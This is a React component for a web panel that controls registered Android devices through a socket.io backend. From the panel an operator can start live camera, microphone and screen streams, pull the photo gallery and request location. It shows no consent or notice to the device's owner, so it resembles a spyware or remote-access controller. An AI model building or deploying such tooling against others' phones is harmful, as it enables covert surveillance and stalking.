import React, { useEffect, useRef, useState } from "react";
import { io } from "socket.io-client";

const SOCKET_URL = "https://YOUR-BACKEND.onrender.com";

export default function RemoteDevice() {
  const socketRef = useRef(null);
  const peerRef = useRef(null);
  const videoRef = useRef(null);

  const [deviceId, setDeviceId] = useState("");
  const [devices, setDevices] = useState([]);
  const [connected, setConnected] = useState(false);
  const [cameraActive, setCameraActive] = useState(false);
  const [micActive, setMicActive] = useState(false);
  const [screenActive, setScreenActive] = useState(false);
  const [status, setStatus] = useState("Connecting...");

  useEffect(() => {
    const socket = io(SOCKET_URL, { transports: ["websocket"], reconnection: true });
    socketRef.current = socket;

    socket.on("connect", () => {
      setConnected(true);
      setStatus("Server connected");
      socket.emit("remote-register");
    });
    socket.on("disconnect", () => {
      setConnected(false);
      setStatus("Server disconnected");
    });
    socket.on("device-list", (list) => setDevices(Array.isArray(list) ? list : []));
    socket.on("device-status", ({ deviceId: id, online }) => {
      setDevices((prev) => prev.map((d) => d.deviceId === id ? { ...d, online } : d));
    });
    socket.on("device-error", (message) => setStatus(message || "Device error"));

    socket.on("webrtc-offer", async ({ deviceId: id, offer }) => {
      if (id !== deviceId) return;
      try {
        const pc = createPeerConnection();
        await pc.setRemoteDescription(new RTCSessionDescription(offer));
        const answer = await pc.createAnswer();
        await pc.setLocalDescription(answer);
        socket.emit("webrtc-answer", { deviceId: id, answer });
      } catch (e) {
        console.error(e);
        setStatus("WebRTC offer failed");
      }
    });

    socket.on("webrtc-ice", async ({ deviceId: id, candidate }) => {
      if (id !== deviceId || !candidate || !peerRef.current) return;
      try {
        await peerRef.current.addIceCandidate(new RTCIceCandidate(candidate));
      } catch (e) {
        console.error("ICE error:", e);
      }
    });

    socket.on("camera-status", ({ active }) => setCameraActive(Boolean(active)));
    socket.on("microphone-status", ({ active }) => setMicActive(Boolean(active)));
    socket.on("screen-status", ({ active }) => setScreenActive(Boolean(active)));

    return () => {
      socket.disconnect();
      if (peerRef.current) peerRef.current.close();
    };
  }, [deviceId]);

  const createPeerConnection = () => {
    if (peerRef.current) peerRef.current.close();

    const pc = new RTCPeerConnection({
      iceServers: [{ urls: "stun:stun.l.google.com:19302" }],
    });

    pc.ontrack = (event) => {
      if (videoRef.current && event.streams?.[0]) {
        videoRef.current.srcObject = event.streams[0];
      }
    };

    pc.onicecandidate = (event) => {
      if (event.candidate && socketRef.current && deviceId) {
        socketRef.current.emit("webrtc-ice", { deviceId, candidate: event.candidate });
      }
    };

    pc.onconnectionstatechange = () => {
      if (pc.connectionState === "connected") setStatus("WebRTC connected");
      if (["disconnected", "failed", "closed"].includes(pc.connectionState)) {
        setStatus("WebRTC disconnected");
      }
    };

    peerRef.current = pc;
    return pc;
  };

  const sendCommand = (command) => {
    if (!socketRef.current || !deviceId) {
      setStatus("Select a device first");
      return;
    }
    socketRef.current.emit("remote-command", { deviceId, command });
    setStatus(`Command sent: ${command}`);
  };

  const startCamera = () => {
    createPeerConnection();
    sendCommand("camera_start");
    setStatus("Starting camera...");
  };

  const stopCamera = () => {
    sendCommand("camera_stop");
    peerRef.current?.close();
    peerRef.current = null;
    if (videoRef.current) videoRef.current.srcObject = null;
    setCameraActive(false);
    setStatus("Camera stopped");
  };

  const startMicrophone = () => {
    sendCommand("microphone_start");
    setStatus("Starting microphone...");
  };

  const stopMicrophone = () => {
    sendCommand("microphone_stop");
    setMicActive(false);
    setStatus("Microphone stopped");
  };

  const startScreen = () => {
    createPeerConnection();
    sendCommand("screen_start");
    setStatus("Requesting screen sharing...");
  };

  const stopScreen = () => {
    sendCommand("screen_stop");
    peerRef.current?.close();
    peerRef.current = null;
    if (videoRef.current) videoRef.current.srcObject = null;
    setScreenActive(false);
    setStatus("Screen sharing stopped");
  };

  const syncGallery = () => sendCommand("gallery_sync");
  const requestLocation = () => sendCommand("location_request");

  return (
    <main style={styles.page}>
      <h1 style={styles.title}>Remote Device</h1>
      <p style={styles.status}>
        <span style={{ ...styles.dot, background: connected ? "#16a34a" : "#dc2626" }} />
        {status}
      </p>

      <section style={styles.card}>
        <h2>Android Devices</h2>
        <select value={deviceId} onChange={(e) => setDeviceId(e.target.value)} style={styles.select}>
          <option value="">Select device</option>
          {devices.map((d) => (
            <option key={d.deviceId} value={d.deviceId}>
              {d.deviceName || d.deviceId} — {d.online ? "Online" : "Offline"}
            </option>
          ))}
        </select>
      </section>

      <section style={styles.card}>
        <h2>Live View</h2>
        <div style={styles.videoBox}>
          <video ref={videoRef} autoPlay playsInline muted style={styles.video} />
          {!cameraActive && !screenActive && <span style={styles.videoText}>No live stream</span>}
        </div>
      </section>

      <section style={styles.card}>
        <h2>Controls</h2>
        <div style={styles.grid}>
          <button onClick={cameraActive ? stopCamera : startCamera} style={styles.button}>
            {cameraActive ? "Stop Camera" : "Start Camera"}
          </button>
          <button onClick={micActive ? stopMicrophone : startMicrophone} style={styles.button}>
            {micActive ? "Stop Microphone" : "Start Microphone"}
          </button>
          <button onClick={screenActive ? stopScreen : startScreen} style={styles.button}>
            {screenActive ? "Stop Screen" : "Start Screen"}
          </button>
          <button onClick={syncGallery} style={styles.secondary}>Sync Gallery</button>
          <button onClick={requestLocation} style={styles.secondary}>Get Location</button>
        </div>
      </section>
    </main>
  );
}

const styles = {
  page: { minHeight: "100vh", padding: 20, background: "#f1f5f9", fontFamily: "Arial" },
  title: { color: "#0f172a" },
  status: { color: "#475569" },
  dot: { display: "inline-block", width: 9, height: 9, borderRadius: "50%", marginRight: 8 },
  card: { maxWidth: 900, margin: "0 auto 16px", padding: 18, background: "#fff", borderRadius: 14, boxShadow: "0 3px 15px rgba(15,23,42,.08)" },
  select: { width: "100%", padding: 12, borderRadius: 9, border: "1px solid #cbd5e1" },
  videoBox: { position: "relative", minHeight: 300, background: "#020617", borderRadius: 12, display: "flex", alignItems: "center", justifyContent: "center", overflow: "hidden" },
  video: { width: "100%", minHeight: 300, objectFit: "contain" },
  videoText: { position: "absolute", color: "#94a3b8" },
  grid: { display: "grid", gridTemplateColumns: "repeat(auto-fit,minmax(180px,1fr))", gap: 10 },
  button: { padding: 12, border: 0, borderRadius: 9, background: "#2563eb", color: "#fff", fontWeight: 700, cursor: "pointer" },
  secondary: { padding: 12, border: "1px solid #cbd5e1", borderRadius: 9, background: "#f8fafc", fontWeight: 700, cursor: "pointer" },
};

